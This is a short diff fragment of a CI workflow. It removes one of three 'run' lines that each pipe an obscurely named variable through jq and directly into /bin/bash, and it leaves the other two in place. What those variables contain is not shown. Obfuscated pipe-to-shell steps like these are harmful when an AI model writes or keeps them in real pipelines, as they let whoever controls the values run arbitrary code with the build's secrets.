@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$q96068" | jq -r .aqvk8968 | /bin/bash
           echo $gbevv4862 | jq -r .brth30737 | /bin/bash
-          echo $jro456 | jq -r .ookl3065 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
